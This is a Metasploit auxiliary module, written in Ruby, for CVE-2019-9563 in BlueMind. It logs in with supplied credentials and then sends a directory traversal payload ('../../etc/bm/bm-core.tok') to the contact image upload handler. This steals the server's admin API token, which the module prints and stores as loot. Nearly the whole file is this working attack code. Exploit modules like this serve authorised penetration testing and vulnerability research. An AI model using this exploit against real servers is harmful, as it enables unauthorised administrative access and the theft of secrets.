##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'BlueMind Contact Temporary Image Upload Handler Directory Traversal Vulnerability',
      'Description'    => %q{
        Uses credentials to retrieve the admin0 API key of a BlueMind server.
      },
      'References'     =>
        [
          'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9563'
        ],
      'Author'         =>
        [
          'Damien Picard <damien.picard[at]synacktiv.com>',
          'Julien Szlamowicz <julien.szlamowicz[at]synacktiv.com>',
        ],
      'License'        => MSF_LICENSE
    ))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'Target URI', '/']),
        OptString.new('LOGIN', [true, 'BlueMind user login']),
        OptString.new('PASSWORD', [true, 'BlueMind user password']),
      ])
  end

  def loginuri
    normalize_uri(datastore['TARGETURI'], 'login', 'index.html')
  end

  def check
    vprint_status('Requesting login page to check version.')
    resp = send_request_cgi({
      'method' => 'GET',
      'uri' => loginuri,
    })

    fail_with(Failure::Unknown, "Unexpected response code: #{resp.code}") unless resp.code == 200
    version = resp.body.match /<span id="version" title="[^"]*">(\d+)\.(\d+)\.?(\d+)?-?([a-z0-9]*)?/

    if version.nil?
      return Exploit::CheckCode::Unknown
    end

    major = version[1].to_i
    minor = version[2].to_i
    release = version[3].to_i
    hotfix = version[4]
    if major == 3 and minor == 5 and release < 11
      return Exploit::CheckCode::Vulnerable
    end
    if major == 3 and minor == 5 and release == 11 and hotfix.to_i < 7
      return Exploit::CheckCode::Vulnerable
    end
    if major == 4 and minor == 0
      return Exploit::CheckCode::Vulnerable
    end
    return Exploit::CheckCode::Safe
  end

  def bluemind_login
    resp = send_request_cgi({
      'method' => 'GET',
      'uri' => loginuri,
    })

    cookies = resp.get_cookies
    vprint_status("Got initial cookies: #{cookies}")
    csrfToken = resp.body.match(/<input type="hidden" name="csrfToken" value="([^"]*)/)[1]
    vprint_status("Got csrfToken: #{csrfToken}")

    resp = send_request_cgi({
      'method' => 'POST',
      'uri' => loginuri,
      'cookie' => cookies,
      'vars_post' => {
        'login' => datastore['LOGIN'],
        'password' => datastore['PASSWORD'],
        'csrfToken' => csrfToken,
        'priv' => 'priv',
        'submit' => 'Connect'
      }
    })

    fail_with('Authentication failed') unless resp.code == 302
    vprint_good("Successfuly authenticated")
    return resp.get_cookies
  end

  def read_token(session)
    resp = send_request_cgi({
      'uri' => normalize_uri(datastore['TARGETURI'], 'contact', 'image', 'tmpupload'),
      'cookie' => session,
      'vars_get' => {
        'uuid' => '../../etc/bm/bm-core.tok'
      }
    })
    return resp.body
  end

  def run
    fail_with('Not exploitable') unless check == Exploit::CheckCode::Vulnerable
    session = bluemind_login
    token = read_token session
    print_good("Got the admin API token : #{token}")
    store_loot('api-token', 'text/plain', datastore['RHOST'], token, service = datastore['RPORT'])
  end
end
